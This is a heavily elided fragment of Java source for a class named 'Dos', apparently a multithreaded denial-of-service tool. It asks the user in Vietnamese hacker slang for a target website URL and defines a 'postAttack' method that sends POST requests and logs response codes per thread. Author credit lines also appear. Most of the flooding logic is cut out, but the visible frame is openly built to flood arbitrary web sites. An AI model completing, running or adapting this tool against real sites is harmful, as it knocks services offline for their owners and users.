...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("Nhập URL Trang Web Vào Đi Hắc Lỏ: ");
        url = in.nextLine();
        System.out.println("\n");
        ...
        System.out.println("© Copyright: Nguyen Tuan Tu");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("FB: Nguyễn Tuấn Tú: " + responseCode + "Thread: " + this.seq);
    }
